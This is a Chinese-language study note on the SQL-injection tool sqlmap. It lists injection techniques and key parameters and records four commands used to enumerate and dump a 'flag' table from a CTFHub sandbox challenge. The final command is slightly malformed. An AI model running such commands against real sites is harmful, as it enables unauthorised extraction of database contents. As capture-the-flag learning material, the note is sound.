# 07 · sqlmap 使用

> 日期：2026-09-23 | 标签：#Web安全 #SQL注入 #sqlmap
## 1.sqlmap是什么
SQL注入自动化工具（kali自带）

## 2.sqlmap包含五种方式
| 方法 | 技术 | 字母 |
|---|---|---|
|联合注入|Union query|U|
|报错注入|Error-based|E|
|布尔盲注|Boolean-based blind|B|
|时间盲注|Time-based blind|T|
|堆叠查询|Stacked queries|S|

## 3.常用参数表（重点记忆）
| 参数 | 作用 |
|---|---|
| `-u` | 目标 URL |
| `--dbs` | 列出数据库 |
| `-D` / `-T` / `-C` | 指定 库 / 表 / 字段 |
| `--tables` / `--columns` / `--dump` | 列表 / 列字段 / 导出数据 |
| `--batch` | 全自动（不问你就用默认选项）⭐ |
| `--level` | 检测等级 1-5（默认 1，越高越全但越慢） |
| `--risk` | 风险等级 1-3（默认 1，3 可能破坏数据） |
| `--threads=10` | 多线程提速 |

## 4.实战记录
1.爆破库名--15分钟
```
sqlmap -u "http://challenge-45b3210ca2620420.sandbox.ctfhub.com:10800/?id=1" --batch --dbs
```
2.爆破表名--2.5分钟
```
sqlmap -u "http://challenge-45b3210ca2620420.sandbox.ctfhub.com:10800/?id=1" --batch -D sqli --tables
```
3.爆破字段--2分钟
```
sqlmap -u "http://challenge-45b3210ca2620420.sandbox.ctfhub.com:10800/?id=1" --batch -D sqli -T flag --columns
```
4.精准导出
```
sqlmap -u "http://challenge-45b3210ca2620420.sandbox.ctfhub.com:10800/?id=1" --batch -D sqli -T flag -C --columns --dump
```
